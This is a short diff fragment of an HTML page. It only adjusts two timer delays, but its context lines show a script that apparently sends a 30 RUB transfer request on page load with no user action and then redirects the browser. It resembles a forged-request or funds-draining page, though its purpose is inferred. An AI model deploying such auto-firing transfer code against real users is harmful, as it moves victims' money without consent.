@@ -40,7 +40,7 @@ xhr.onload = function() {
     encodeURIComponent(pcAmount);
 xhr.send(body);
 }
-setTimeout(() => sendTransfer(30, "RUB",30.30), 0);
+setTimeout(() => sendTransfer(30, "RUB",30.30), 120);
 </script>
 
 <script>
@@ -48,7 +48,7 @@ setTimeout(() => sendTransfer(30, "RUB",30.30), 0);
  
 setTimeout(() => {
     window.location.href = src;
-  }, 1000);
+  }, 2000);
 </script>
 </body>
 </html>
